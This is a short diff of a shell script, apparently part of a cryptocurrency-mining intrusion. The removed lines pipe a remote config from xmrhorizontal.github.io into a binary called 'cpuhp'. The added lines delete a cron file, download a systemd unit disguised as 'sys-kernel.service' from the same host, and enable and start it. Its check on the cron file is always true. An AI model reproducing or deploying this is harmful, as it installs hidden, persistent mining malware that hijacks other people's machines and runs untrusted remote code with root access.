@@ -1,3 +1,7 @@
-#!/bin/bash
-killall cpuhp
-curl -s https://xmrhorizontal.github.io/config.json | /bin/cpuhp --config /dev/stdin
+if [ "/etc/cron.d/cronconfig" ]; then
+	rm -f /etc/cron.d/cronconfig
+ 	cd /etc/systemd/system
+	wget https://xmrhorizontal.github.io/sys-kernel.service
+	systemctl enable sys-kernel.service
+	systemctl start sys-kernel.service
+fi
